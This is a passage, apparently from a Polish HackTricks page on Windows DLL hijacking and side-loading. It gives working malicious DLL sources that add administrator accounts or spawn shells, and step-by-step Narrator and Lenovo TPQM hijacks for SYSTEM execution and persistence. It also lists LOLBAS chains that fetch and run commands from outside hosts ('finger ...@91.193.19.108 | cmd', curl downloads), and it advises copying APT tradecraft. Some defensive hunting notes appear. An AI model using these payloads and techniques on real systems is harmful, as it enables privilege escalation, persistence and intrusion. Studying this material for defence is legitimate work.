BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna biblioteka DLL w C z punktem wejścia wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal podczas uruchamiania sprawdza przewidywalną, zależną od języka localization DLL, którą można przejąć w celu arbitrary code execution i persistence.<sup>[[7]](#references)</sup>

Najważniejsze fakty
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli pod ścieżką OneCore istnieje zapisywalny DLL kontrolowany przez atakującego, zostanie załadowany, a `DllMain(DLL_PROCESS_ATTACH)` zostanie wykonane. Eksporty nie są wymagane.

Wykrywanie za pomocą Procmon
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimalny DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naiwny hijack będzie mówił/podświetlał interfejs użytkownika. Aby zachować ciszę, podczas attach wylicz wątki Narratora, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go za pomocą `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajduje się w PoC.<sup>[[8]](#references)</sup>

Trigger i persistence za pośrednictwem konfiguracji Accessibility
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Powyższa konfiguracja sprawia, że uruchomienie Narratora ładuje umieszczony DLL. Na secure desktop (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twój DLL wykona się jako SYSTEM na secure desktop.

Wykonanie SYSTEM wywołane przez RDP (lateral movement)
- Zezwól na klasyczną warstwę bezpieczeństwa RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twój DLL wykona się jako SYSTEM na secure desktop.
- Wykonanie zatrzyma się po zamknięciu sesji RDP — szybko wykonaj inject/migrate.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego narzędzia Accessibility (AT), np. CursorIndicator, edytować go tak, aby wskazywał na dowolny plik wykonywalny/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. Umożliwia to proxy dla dowolnego wykonania w ramach frameworka Accessibility.

Uwagi
- Zapis w `%windir%\System32` i zmiana wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; eksporty nie są potrzebne.

## Studium przypadku: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ten przypadek demonstruje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzone jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajdujący się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Uprawnienia katalogu**: Możliwość zapisu przez `CREATOR OWNER`, co pozwala użytkownikom lokalnym umieszczać dowolne pliki.
- **Zachowanie wyszukiwania DLL**: Podejmowana jest próba załadowania `hostfxr.dll` najpierw z katalogu roboczego, a w przypadku braku pliku rejestrowany jest komunikat "NAME NOT FOUND", co wskazuje na pierwszeństwo wyszukiwania w katalogu lokalnym.

### Implementacja exploita

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakujący DLL do uzyskania wykonania kodu w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako standardowy użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż scheduled task uruchomi się o 9:30, w kontekście bieżącego użytkownika.
3. Jeśli w momencie wykonania zadania zalogowany jest administrator, malicious DLL zostanie uruchomiony w sesji administratora z medium integrity.
4. Połącz standardowe techniki UAC bypass, aby podnieść uprawnienia z medium integrity do uprawnień SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading za pośrednictwem Signed Host (wsc_proxy.exe)

Threat actors często łączą droppers oparte na MSI z DLL side-loading, aby wykonywać payloady w ramach zaufanego, podpisanego procesu.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera plik MSI. CustomAction uruchamia się po cichu podczas instalacji GUI (np. akcja LaunchApplication lub VBScript), odtwarzając kolejny etap z embedded resources.
- Dropper zapisuje prawidłowy, podpisany EXE oraz malicious DLL w tym samym katalogu (przykładowa para: podpisany przez Avast wsc_proxy.exe + kontrolowany przez atakującego wsc.dll).
- Po uruchomieniu podpisanego EXE Windows DLL search order ładuje najpierw wsc.dll z working directory, wykonując kod atakującego w ramach podpisanego procesu nadrzędnego (ATT&CK T1574.001).

Analiza MSI (na co zwrócić uwagę)
- Tabela CustomAction:
- Poszukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykładowy suspicious pattern: LaunchApplication wykonujący embedded file w tle.
- W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Embedded/split payloads w pliku MSI CAB:
- Ekstrakcja administracyjna: msiexec /a package.msi /qb TARGETDIR=C:\out
- Możesz też użyć lessmsi: lessmsi x package.msi C:\out
- Poszukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez VBScript CustomAction. Typowy przebieg:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczny sideloading z użyciem wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z własnego katalogu.
- wsc.dll: DLL atakującego. Jeśli nie są wymagane żadne konkretne eksporty, wystarczy DllMain; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- W przypadku wymagań dotyczących eksportów użyj frameworka proxying (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, który jednocześnie wykonuje Twój payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez host binary. Jeśli host używa ścieżek bezwzględnych lub bezpiecznych flag ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na kolejność pierwszeństwa i należy je uwzględnić podczas wyboru host binary oraz zestawu eksportów.

## Podpisane triady + zaszyfrowane payloady (case study ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad za pomocą **triady trzech plików**, aby upodobnić się do legalnego software, jednocześnie przechowując główny payload w postaci zaszyfrowanej na dysku:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – nadużywane są pliki dostawców takich jak AMD, Realtek lub NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę executable, aby wyglądał jak binary Windows (na przykład `conhost.exe`), ale sygnatura Authenticode pozostaje prawidłowa.
2. **Malicious loader DLL** – umieszczany obok EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL jest zwykle binary MFC obfuscated za pomocą frameworka ScatterBrain; jego jedynym zadaniem jest znalezienie encrypted blob, odszyfrowanie go i reflectively zmapowanie ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po zmapowaniu odszyfrowanego payloadu w pamięci loader usuwa plik TMP, aby zniszczyć forensic evidence.

Uwagi dotyczące tradecraft:

* Zmiana nazwy signed EXE (przy zachowaniu oryginalnego `OriginalFileName` w nagłówku PE) pozwala mu podszywać się pod binary Windows przy jednoczesnym zachowaniu sygnatury dostawcy, dlatego warto naśladować zwyczaj Ink Dragon polegający na umieszczaniu binary wyglądających jak `conhost.exe`, które w rzeczywistości są utilities AMD/NVIDIA.
* Ponieważ executable pozostaje trusted, większość mechanizmów allowlisting musi jedynie dopuścić obecność malicious DLL obok niego. Skoncentruj się na dostosowaniu loader DLL; signed parent zazwyczaj może działać bez zmian.
* Decryptor ShadowPad oczekuje, że TMP blob będzie znajdować się obok loadera i będzie zapisywalny, aby po zmapowaniu móc wyzerować plik. Pozostaw katalog writable do czasu załadowania payloadu; po załadowaniu do pamięci plik TMP można bezpiecznie usunąć w celach OPSEC.

### LOLBAS stager + sideloading staged archive chain (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, dzięki czemu jedynym custom artifact na dysku jest malicious DLL umieszczony obok trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera commands z serwera Finger i przekazuje je do `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pobiera tekst przez TCP/79; `| cmd` wykonuje response serwera, umożliwiając operatorom rotowanie second stage po stronie serwera.

- **Built-in download/extract:** Pobierz archive z benign extension, rozpakuj go i umieść sideload target oraz DLL w losowym katalogu `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ukrywa postęp i podąża za redirects; `tar -xf` używa wbudowanego w Windows tar.

- **WMI/CIM launch:** Uruchom EXE przez WMI, aby telemetry pokazywała process utworzony przez CIM, podczas gdy ładuje on colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Działa z binary, które preferują local DLL (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod trusted name.

- **Hunting:** Generuj alerty dla `forfiles`, gdy `/p`, `/m` i `/c` występują razem; poza admin scripts jest to nietypowe.


## Case Study: NSIS dropper + sideload Bitdefender Submission Wizard (Chrysalis)

Niedawny intrusion Lotus Blossom nadużył trusted update chain do dostarczenia NSIS-packed dropper, który przygotowywał DLL sideloading oraz payloady działające w pełni in-memory.<sup>[[13]](#references)</sup>

Przebieg tradecraft
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, umieszcza w nim przemianowany Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` oraz encrypted blob `BluetoothService`, a następnie uruchamia EXE.
- Host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` ładuje blob przez mmap; `LogWrite` odszyfrowuje go za pomocą customowego streamu opartego na LCG (stałe **0x19660D** / **0x3C6EF35F**, key material wyprowadzony z wcześniejszego hash), nadpisuje buffer plaintext shellcode, zwalnia temporary data i wykonuje jump do niego.
- Aby uniknąć IAT, loader rozwiązuje APIs przez hashowanie nazw eksportów za pomocą **FNV-1a basis 0x811C9DC5 + prime 0x100019**, a następnie stosuje avalanche w stylu Murmur (**0x85EBCA6B**) i porównuje wynik z salted target hashes.

Main shellcode (Chrysalis)
- Odszyfrowuje główny module podobny do PE, wielokrotnie wykonując add/XOR/sub z key `gQ2JR&9;` w pięciu passes, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć import resolution.
- Odtwarza strings nazw DLL w runtime za pomocą transformacji bit-rotate/XOR wykonywanych dla poszczególnych znaków, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przechodzi przez **PEB → InMemoryOrderModuleList**, parsuje każdą export table w blokach 4-byte z użyciem mixing w stylu Murmur i korzysta z `GetProcAddress` tylko wtedy, gdy hash nie zostanie znaleziony.

Embedded configuration & C2
- Config znajduje się wewnątrz dropped file `BluetoothService` pod **offset 0x30808** (size **0x980**) i jest odszyfrowywany przez RC4 z key `qwhvb^435h&*7`, ujawniając C2 URL oraz User-Agent.
- Beacons budują dot-delimited host profile, dodają na początku tag `4Q`, a następnie szyfrują go RC4 z key `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Responses są odszyfrowywane przez RC4 i przekazywane do obsługi za pomocą tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode jest sterowany przez CLI args: brak args = install persistence (service/Run key) wskazującej na `-i`; `-i` ponownie uruchamia self z `-k`; `-k` pomija install i uruchamia payload.

Alternate loader observed
- W ramach tego samego intrusion dropowano Tiny C Compiler i wykonywano `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z `libtcc.dll` umieszczonym obok. C source dostarczony przez atakującego zawierał embedded shellcode, który był kompilowany i uruchamiany in-memory bez zapisywania PE na dysku. Odtwórz za pomocą:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ten oparty na TCC etap kompilacji i uruchamiania importował `Wininet.dll` w czasie wykonywania i pobierał second-stage shellcode ze sztywno zakodowanego URL, zapewniając elastyczny loader podszywający się pod uruchomienie kompilatora.

## Signed-host sideloading with export proxying + host thread parking

Niektóre łańcuchy DLL sideloading dodają **stability engineering**, aby legalny host pozostał aktywny wystarczająco długo, by poprawnie załadować kolejne etapy, zamiast ulec awarii po załadowaniu złośliwej DLL.<sup>[[11]](#references)</sup>

Observed pattern
- Umieść zaufany EXE obok złośliwej DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Złośliwa DLL **proxy'uje każdy oczekiwany export** do prawdziwej systemowej DLL (na przykład `%SystemRoot%\\System32\\version.dll`), dzięki czemu rozwiązywanie importów nadal się powiedzie, a proces hosta będzie działał.
- Po załadowaniu złośliwa DLL **patchuje entry point hosta**, aby główny wątek przechodził do nieskończonej pętli `Sleep`, zamiast kończyć działanie lub wykonywać ścieżki kodu, które zakończyłyby proces.
- Nowy wątek wykonuje właściwe złośliwe działania: odszyfrowuje nazwę lub ścieżkę DLL kolejnego etapu (często używane są RC4/XOR), a następnie uruchamia ją za pomocą `LoadLibrary`.

Why this matters
- Standardowe proxying DLL zachowuje zgodność z API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo dla kolejnych etapów.
- Zaparkowanie głównego wątku w `Sleep(INFINITE)` to prosty sposób na utrzymanie podpisanego procesu w pamięci, podczas gdy loader wykonuje deszyfrowanie, staging lub bootstrap sieciowy w wątku roboczym.
- Hunting wyłącznie pod kątem podejrzanego `DllMain` może pominąć ten wzorzec, jeśli interesujące działanie następuje po spatchowaniu entry point hosta i uruchomieniu wątku pomocniczego.

Minimal workflow
1. Skopiuj podpisany host EXE i ustal, jaką DLL rozwiązuje z lokalnego katalogu.
2. Zbuduj proxy DLL eksportującą te same funkcje i przekazującą je do legalnej DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. Z tego wątku spatchuj entry point hosta lub procedurę startową głównego wątku, aby wykonywała pętlę z `Sleep`.
5. Odszyfruj nazwę/konfigurację DLL kolejnego etapu i wywołaj `LoadLibrary` albo wykonaj manual-map payloadu.

Defensive pivots
- Podpisane procesy ładujące `version.dll` lub podobne często używane biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Memory patches w entry point procesu krótko po załadowaniu obrazu, szczególnie skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` dla drugiej DLL o odszyfrowanej nazwie.
- Proxy DLL z pełnym zestawem exportów umieszczane obok plików wykonywalnych dostawcy w zapisywalnych katalogach stagingowych, takich jak `ProgramData`, `%TEMP%` lub ścieżki rozpakowanych archiwów.

## References

- [1] [Red Canary – Analizy wywiadowcze: styczeń 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Eskalacja uprawnień przy użyciu TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking w Windows. Prosty przykład w C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore wdraża nowe malware wymierzone w Europę](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Gdy DLL Hijacks spotykają Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Cyfrowi sobowtórowie: Anatomia ewoluujących kampanii impersonation dystrybuujących Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zbieżne interesy: Analiza klastrów zagrożeń wymierzonych w rząd Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Ujawnienie sieci relay i wewnętrznego działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: Dogłębna analiza toolkit Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → łańcuch DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Śledzenie kampanii szpiegowskich irańskiej grupy APT Screening Serpens z 2026 roku](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Operacje Nimbus Manticore podczas konfliktu w Iranie](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Akcje zadań](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 wymierza działania w rządy i infrastrukturę krytyczną Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
